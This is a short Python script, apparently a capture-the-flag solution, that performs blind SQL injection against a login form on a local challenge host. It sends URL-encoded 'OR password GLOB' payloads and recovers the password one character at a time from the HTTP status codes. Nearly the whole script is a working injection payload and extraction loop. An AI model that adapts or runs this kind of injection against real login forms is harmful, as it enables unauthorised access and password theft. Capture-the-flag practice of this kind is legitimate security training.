import requests as req

host = 'challenge.localhost'
path ='/'
url='http://' + host + path
headers = {"Content-Type": "application/x-www-form-urlencoded"}

flag = "pwn."

for loops in range(0,80):
    for i in range(0x21, 0x7F):
        if i == 0x21:
            print(">>>",end=" ")
        if i in {0x2A, 0x3F}:
            continue
        if i == 0x7E:
            print("EOF")
            quit()
        payload = f"username=admin&password=%20%22+OR+password+GLOB+%22{flag}%{hex(i)[2:]}%2A%22+--"
        r= req.post(url,headers=headers,data=payload)
        if r.status_code == 200:
            flag = flag + chr(i)
            print(r.status_code, flag, hex(i))
            break
